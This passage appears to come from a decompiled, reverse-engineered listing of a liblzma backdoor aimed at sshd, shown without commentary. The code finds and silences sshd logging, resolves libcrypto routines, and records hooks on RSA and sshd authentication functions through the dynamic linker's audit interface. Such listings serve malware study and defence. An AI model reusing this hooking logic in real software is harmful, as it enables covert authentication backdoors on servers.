        while( TRUE ) {
          if ((local_980.sshd_string_refs.entries[0x1a].func_end <= local_b48) ||
             ((local_b20 != (u8 *)0x0 && (sshd_code_end_ptr != (u8 *)0x0)))) goto LAB_00106bf0;
          BVar26 = x86_dasm(&local_a30,local_b48,
                            (u8 *)local_980.sshd_string_refs.entries[0x1a].func_end);
          if (BVar26 != FALSE) break;
          local_b48 = local_b48 + 1;
        }
        if ((*(u32 *)&local_a30.opcode_window[3] & 0xfffffffd) == 0xb1) {
          if (local_a30.prefix.decoded.modrm.breakdown.modrm_mod != '\x03') goto LAB_00106735;
          if ((local_a30.prefix.flags_u16 & 0x1040) == 0) {
            if ((local_a30.prefix.flags_u16 & 0x40) != 0) {
              reg_tmp = 0;
LAB_001067cf:
              reg_upper = local_a30.prefix.decoded.modrm.breakdown.modrm_rm;
              if ((local_a30.prefix.flags_u16 & 0x20) != 0) {
                reg_upper = local_a30.prefix.decoded.modrm.breakdown.modrm_rm | ((byte)local_a30.prefix.decoded.rex & 1) << 3;
              }
              goto LAB_001067ed;
            }
            reg_upper = 0;
          }
          else {
            if ((local_a30.prefix.flags_u16 & 0x40) != 0) {
              reg_tmp = local_a30.prefix.decoded.modrm.breakdown.modrm_reg;
              if ((local_a30.prefix.flags_u16 & 0x20) != 0) {
                reg_tmp = reg_tmp | (char)local_a30.prefix.decoded.rex * '\x02' & 8U;
              }
              goto LAB_001067cf;
            }
            reg_upper = local_a30.prefix.decoded.flags2 & 0x10;
            if ((local_a30.prefix.flags_u16 & 0x1000) == 0) goto LAB_001067fb;
            reg_tmp = local_a30.mov_imm_reg_index;
            if ((local_a30.prefix.flags_u16 & 0x20) != 0) {
              reg_tmp = local_a30.mov_imm_reg_index | ((byte)local_a30.prefix.decoded.rex & 1) << 3;
            }
            reg_upper = 0;
LAB_001067ed:
            if (reg_tmp != reg_upper) goto LAB_00106735;
          }
LAB_001067fb:
          reg_lower = 0;
          log_string_slot = 0;
          sshd_code_end_ptr = (u8 *)0x0;
          insn_ctx_cursor = &local_9d8;
          for (loop_idx = 0x16; loop_idx != 0; loop_idx = loop_idx + -1) {
            *(undefined4 *)&insn_ctx_cursor->instruction = 0;
            insn_ctx_cursor = (dasm_ctx_t *)((long)insn_ctx_cursor + (ulong)zero_seed * -8 + 4);
          }
          payload_end = (u8 *)0x0;
          lzma_code_end = local_b48;
          for (; (lzma_code_end < local_980.sshd_string_refs.entries[0x1a].func_end && (log_string_slot < 5));
              log_string_slot = log_string_slot + 1) {
            if ((payload_end != (u8 *)0x0) && (sshd_code_end_ptr != (u8 *)0x0)) goto LAB_00106b3c;
            BVar26 = find_mov_instruction
                               (lzma_code_end,(u8 *)local_980.sshd_string_refs.entries[0x1a].func_end,TRUE
                                ,FALSE,&local_9d8);
            if (BVar26 == FALSE) break;
            if ((local_9d8.prefix.flags_u16 & 0x1040) != 0) {
              if ((local_9d8.prefix.flags_u16 & 0x40) == 0) {
                reg_lower = local_9d8.prefix.decoded.flags2 & 0x10;
                if (((local_9d8.prefix.flags_u16 & 0x1000) != 0) &&
                   (reg_lower = local_9d8.mov_imm_reg_index, (local_9d8.prefix.flags_u16 & 0x20) != 0))
                {
                  reg_tmp = (char)local_9d8.prefix.decoded.rex << 3;
                  goto LAB_001068e4;
                }
              }
              else {
                reg_lower = local_9d8.prefix.decoded.modrm.breakdown.modrm_reg;
                if ((local_9d8.prefix.flags_u16 & 0x20) != 0) {
                  reg_tmp = (char)local_9d8.prefix.decoded.rex * '\x02';
LAB_001068e4:
                  reg_lower = reg_lower | reg_tmp & 8;
                }
              }
            }
            lzma_code_end = sshd_code_end_ptr;
            if ((reg_upper == reg_lower) && ((local_9d8.prefix.flags_u16 & 0x100) != 0)) {
              payload_cursor = (u8 *)local_9d8.mem_disp;
              if (((uint)local_9d8.prefix.decoded.modrm & 0xff00ff00) == 0x5000000) {
                payload_cursor = (u8 *)(local_9d8.mem_disp + (long)local_9d8.instruction) +
                          CONCAT44(*(uint *)((u8 *)&local_9d8.instruction_size + 4),
                                   (undefined4)local_9d8.instruction_size);
              }
              local_a90 = 0;
              offset_patch_ptr = (u8 *)elf_get_data_segment(&local_980.main_info,&local_a90,FALSE);
              if ((((offset_patch_ptr == (u8 *)0x0) || (offset_patch_ptr + local_a90 <= payload_cursor)) ||
                  (payload_cursor < offset_patch_ptr)) ||
                 (((payload_cursor == sshd_code_end_ptr && (payload_cursor == payload_end)) ||
                  (lzma_code_end = payload_cursor, payload_end != (u8 *)0x0)))) goto LAB_00106997;
            }
            else {
LAB_00106997:
              payload_cursor = payload_end;
              sshd_code_end_ptr = lzma_code_end;
            }
            lzma_code_end = local_9d8.instruction +
                      CONCAT44(*(uint *)((u8 *)&local_9d8.instruction_size + 4),
                               (undefined4)local_9d8.instruction_size);
            payload_end = payload_cursor;
          }
          if ((payload_end == (u8 *)0x0) || (sshd_code_end_ptr == (u8 *)0x0)) {
LAB_00106ab1:
            sshd_code_end_ptr = (u8 *)0x0;
            local_b20 = (u8 *)0x0;
          }
          else {
LAB_00106b3c:
            BVar26 = validate_log_handler_pointers
                               (payload_end,sshd_code_end_ptr,code_segment,(u8 *)((long)code_segment + signed_data_size),
                                &local_980.sshd_string_refs,ctx);
            local_b20 = payload_end;
            if (BVar26 != FALSE) {
              sshd_log_ctx->log_handler_ptr = payload_end;
              libcrypto_info = &local_980.main_info;
              sshd_log_ctx->log_handler_ctx_ptr = sshd_code_end_ptr;
              sshd_log_ctx->log_hooking_possible = TRUE;
              local_9d8.instruction = (u8 *)CONCAT44(*(uint *)((u8 *)&local_9d8.instruction + 4),0x708);
              pcVar37 = elf_find_string(libcrypto_info,(EncodedStringId *)&local_9d8,(void *)0x0);
              sshd_log_ctx->STR_percent_s = pcVar37;
              if (pcVar37 != (char *)0x0) {
                local_9d8.instruction = (u8 *)CONCAT44(*(uint *)((u8 *)&local_9d8.instruction + 4),0x790);
                pcVar37 = elf_find_string(libcrypto_info,(EncodedStringId *)&local_9d8,(void *)0x0);
                sshd_log_ctx->STR_Connection_closed_by = pcVar37;
                if (pcVar37 != (char *)0x0) {
                  local_9d8.instruction = (u8 *)CONCAT44(*(uint *)((u8 *)&local_9d8.instruction + 4),0x4f0);
                  pcVar37 = elf_find_string(libcrypto_info,(EncodedStringId *)&local_9d8,(void *)0x0);
                  sshd_log_ctx->STR_preauth = pcVar37;
                  if (pcVar37 != (char *)0x0) {
                    local_9d8.instruction = (u8 *)CONCAT44(*(uint *)((u8 *)&local_9d8.instruction + 4),0x1d8);
                    pcVar37 = elf_find_string(libcrypto_info,(EncodedStringId *)&local_9d8,(void *)0x0);
                    sshd_log_ctx->STR_authenticating = pcVar37;
                    if (pcVar37 != (char *)0x0) {
                      local_9d8.instruction = (u8 *)CONCAT44(*(uint *)((u8 *)&local_9d8.instruction + 4),0xb10);
                      pcVar37 = elf_find_string(libcrypto_info,(EncodedStringId *)&local_9d8,(void *)0x0);
                      sshd_log_ctx->STR_user = pcVar37;
                      if (pcVar37 != (char *)0x0) break;
                    }
                  }
                }
              }
              sshd_log_ctx->logging_disabled = TRUE;
              break;
            }
          }
        }
        else if ((((*(u32 *)&local_a30.opcode_window[3] == 0x147) &&
                  ((uint)local_a30.prefix.decoded.modrm >> 8 == 0x50000)) &&
                 ((local_a30.prefix.flags_u16 & 0x800) != 0)) && (local_a30.imm_zeroextended == 0))
        {
          payload_end = (u8 *)0x0;
          if ((local_a30.prefix.flags_u16 & 0x100) != 0) {
            payload_end = local_a30.instruction + local_a30.instruction_size + local_a30.mem_disp;
          }
          local_9d8.instruction = (u8 *)0x0;
          lzma_code_end = (u8 *)elf_get_data_segment(&local_980.main_info,(u64 *)&local_9d8,FALSE);
          if (((lzma_code_end != (u8 *)0x0) && (payload_end < local_9d8.instruction + (long)lzma_code_end)) &&
             (lzma_code_end <= payload_end)) {
            insn_ctx_cursor = &local_9d8;
            for (loop_idx = 0x16; sshd_code_end_ptr = local_b48, loop_idx != 0; loop_idx = loop_idx + -1) {
              *(undefined4 *)&insn_ctx_cursor->instruction = 0;
              insn_ctx_cursor = (dasm_ctx_t *)((long)insn_ctx_cursor + (ulong)zero_seed * -8 + 4);
            }
            do {
              BVar26 = find_instruction_with_mem_operand_ex
                                 (sshd_code_end_ptr,(u8 *)local_980.sshd_string_refs.entries[0x1a].func_end,
                                  &local_9d8,0x147,(void *)0x0);
              if (BVar26 == FALSE) break;
              if ((local_9d8.imm_zeroextended == 0) && ((local_9d8.prefix.flags_u16 & 0x100) != 0))
              {
                sshd_code_end_ptr = (u8 *)local_9d8.mem_disp;
                if (((uint)local_9d8.prefix.decoded.modrm & 0xff00ff00) == 0x5000000) {
                  sshd_code_end_ptr = (u8 *)(local_9d8.mem_disp + (long)local_9d8.instruction) +
                            CONCAT44(*(uint *)((u8 *)&local_9d8.instruction_size + 4),
                                     (undefined4)local_9d8.instruction_size);
                }
                local_a90 = 0;
                lzma_code_end = (u8 *)elf_get_data_segment(&local_980.main_info,&local_a90,FALSE);
                if ((((lzma_code_end != (u8 *)0x0) && (sshd_code_end_ptr < lzma_code_end + local_a90)) &&
                    (lzma_code_end <= sshd_code_end_ptr)) && (payload_end != sshd_code_end_ptr)) goto LAB_00106b3c;
              }
              sshd_code_end_ptr = local_9d8.instruction +
                        CONCAT44(*(uint *)((u8 *)&local_9d8.instruction_size + 4),
                                 (undefined4)local_9d8.instruction_size);
            } while (local_9d8.instruction +
                     CONCAT44(*(uint *)((u8 *)&local_9d8.instruction_size + 4),
                              (undefined4)local_9d8.instruction_size) <
                     local_980.sshd_string_refs.entries[0x1a].func_end);
            goto LAB_00106ab1;
          }
        }
LAB_00106735:
        local_b48 = local_b48 + local_a30.instruction_size;
      } while( TRUE );
    }
  }
LAB_00106bf0:
  libcrypto_allocator->opaque = local_980.elf_handles.libcrypto;
  if (bn_bin2bn_sym != (Elf64_Sym *)0x0) {
    libcrypto_sym_offset = bn_bin2bn_sym->st_value;
    libcrypto_ehdr = (local_980.elf_handles.libcrypto)->elfbase;
    resolved_count_ptr = &(local_b10->imported_funcs).resolved_imports_count;
    *resolved_count_ptr = *resolved_count_ptr + 1;
    (local_b10->imported_funcs).EVP_DecryptUpdate =
         (pfn_EVP_DecryptUpdate_t)(libcrypto_ehdr->e_ident + libcrypto_sym_offset);
  }
  if (bn_dup_sym != (Elf64_Sym *)0x0) {
    libcrypto_sym_offset = bn_dup_sym->st_value;
    libcrypto_ehdr = (local_980.elf_handles.libcrypto)->elfbase;
    resolved_count_ptr = &(local_b10->imported_funcs).resolved_imports_count;
    *resolved_count_ptr = *resolved_count_ptr + 1;
    (local_b10->imported_funcs).EVP_DecryptFinal_ex =
         (pfn_EVP_DecryptFinal_ex_t)(libcrypto_ehdr->e_ident + libcrypto_sym_offset);
  }
  BVar26 = init_imported_funcs(imported_funcs);
  if (((((((BVar26 != FALSE) &&
          (lzma_free((local_b10->imported_funcs).EVP_MD_CTX_new,libcrypto_allocator),
          (local_b10->libc_imports).resolved_imports_count == 0xc)) &&
         (BVar26 = secret_data_append_from_address
                             ((void *)0x1,(secret_data_shift_cursor_t)0x145,0x78,0x18),
         BVar26 != FALSE)) &&
        ((BVar26 = secret_data_append_from_address
                             (params->hook_ctx->symbind64_trampoline,
                              (secret_data_shift_cursor_t)0x12a,4,0x12), BVar26 != FALSE &&
         (BVar26 = secret_data_append_item
                             ((secret_data_shift_cursor_t)0x12e,0x13,4,0x20,
                              (u8 *)params->hook_ctx->rsa_public_decrypt_entry), BVar26 != FALSE))))
       && (BVar26 = secret_data_append_from_address
                              (params->shared_globals->evp_set1_rsa_hook_entry,
                               (secret_data_shift_cursor_t)0x132,6,0x14), BVar26 != FALSE)) &&
      ((BVar26 = secret_data_append_item
                           ((secret_data_shift_cursor_t)0x138,0x15,2,0x10,
                            (u8 *)params->hook_ctx->rsa_get0_key_entry), BVar26 != FALSE &&
       (BVar26 = secret_data_append_item
                           ((secret_data_shift_cursor_t)0xee,0x10,0x26,0x20,
                            (u8 *)params->hook_ctx->mm_answer_keyallowed_entry), BVar26 != FALSE))))
     && ((BVar26 = secret_data_append_item
                             ((secret_data_shift_cursor_t)0x140,0x17,5,0x20,
                              (u8 *)params->hook_ctx->mm_answer_keyverify_entry), BVar26 != FALSE &&
         (((BVar26 = secret_data_append_item
                               ((secret_data_shift_cursor_t)0x13a,0x16,6,0x20,
                                (u8 *)params->shared_globals->authpassword_hook_entry),
           BVar26 != FALSE &&
           (BVar26 = secret_data_append_item
                               ((secret_data_shift_cursor_t)0x114,0x11,0x16,0x10,
                                (u8 *)peVar34->elf_parse), BVar26 != FALSE)) &&
          ((local_b10->global_ctx).num_shifted_bits == 0x1c8)))))) {
    *(local_b10->ldso_ctx).libcrypto_l_name = (char *)local_b10;
    local_980.sshd_link_map = local_980.sshd_link_map + local_ac8 + 8;
    resolver_status = *(u32 *)local_980.sshd_link_map;
    (local_b10->ldso_ctx).sshd_auditstate_bindflags_ptr = (u32 *)local_980.sshd_link_map;
    (local_b10->ldso_ctx).sshd_auditstate_bindflags_old_value = resolver_status;
    *(u32 *)local_980.sshd_link_map = 2;
    hook_table_bytes = (byte *)(local_b10->ldso_ctx).sshd_link_map_l_audit_any_plt_addr;
    *hook_table_bytes = *hook_table_bytes | (local_b10->ldso_ctx).link_map_l_audit_any_plt_bitmask;
    local_980.libcrypto_link_map = local_980.libcrypto_link_map + local_ac8 + 8;
    resolver_status = *(u32 *)local_980.libcrypto_link_map;
    (local_b10->ldso_ctx).libcrypto_auditstate_bindflags_ptr = (u32 *)local_980.libcrypto_link_map;
    (local_b10->ldso_ctx).libcrypto_auditstate_bindflags_old_value = resolver_status;
    audit_ifaces_ptr = &(local_b10->ldso_ctx).hooked_audit_ifaces;
    *(u32 *)local_980.libcrypto_link_map = 1;
    paVar57 = audit_ifaces_ptr;
    for (loop_idx = 0x1e; loop_idx != 0; loop_idx = loop_idx + -1) {
      *(undefined4 *)&paVar57->activity = 0;
      paVar57 = (audit_ifaces *)((long)paVar57 + (ulong)zero_seed * -8 + 4);
    }
    (local_b10->ldso_ctx).hooked_audit_ifaces.symbind =
         (audit_symbind_fn_t)params->hook_ctx->symbind64_trampoline;
    *(local_b10->ldso_ctx)._dl_audit_ptr = audit_ifaces_ptr;
    *(local_b10->ldso_ctx)._dl_naudit_ptr = 1;
    loop_idx = 0;
    libc_allocator = local_980.active_lzma_allocator;
    while (libc_allocator != (lzma_allocator *)0x0) {
      *(undefined1 *)((long)&(local_980.active_lzma_allocator)->alloc + loop_idx) =
           *(undefined1 *)((long)&local_980.saved_lzma_allocator.alloc + loop_idx);
      libc_allocator = (lzma_allocator *)(loop_idx + -0x17);
      loop_idx = loop_idx + 1;
    }
    goto LAB_00105a81;
  }
LAB_00105a60:
  libc_allocator = &local_980.saved_lzma_allocator;
  init_ldso_ctx(&local_b10->ldso_ctx);
  loop_idx = 0;
  libcrypto_allocator = local_980.active_lzma_allocator;
  while (libcrypto_allocator != (lzma_allocator *)0x0) {
    *(undefined1 *)((long)&(local_980.active_lzma_allocator)->alloc + loop_idx) =
         *(undefined1 *)((long)&libc_allocator->alloc + loop_idx);
    libcrypto_allocator = (lzma_allocator *)(loop_idx + -0x17);
    loop_idx = loop_idx + 1;
  }
LAB_00105a81:
  peVar49 = params->entry_ctx;
  (peVar49->got_ctx).tls_got_entry = (void *)0x0;
  (peVar49->got_ctx).cpuid_got_slot = (void *)0x0;
  (peVar49->got_ctx).cpuid_slot_index = 0;
  (peVar49->got_ctx).got_base_offset = 0;
  peVar49->cpuid_random_symbol_addr = (void *)0x1;
  tls_slot = (int *)cpuid_basic_info(0);
  if (*tls_slot != 0) {
    resolved_count_cursor = (undefined4 *)cpuid_Version_info(1);
    resolved_mask0 = resolved_count_cursor[1];
    resolved_mask1 = resolved_count_cursor[2];
    resolved_mask2 = resolved_count_cursor[3];
    *(undefined4 *)&(peVar49->got_ctx).tls_got_entry = *resolved_count_cursor;
    *(undefined4 *)&(peVar49->got_ctx).cpuid_got_slot = resolved_mask0;
    *(undefined4 *)&(peVar49->got_ctx).cpuid_slot_index = resolved_mask2;
    *(undefined4 *)&(peVar49->got_ctx).got_base_offset = resolved_mask1;
  }
  return FALSE;
}

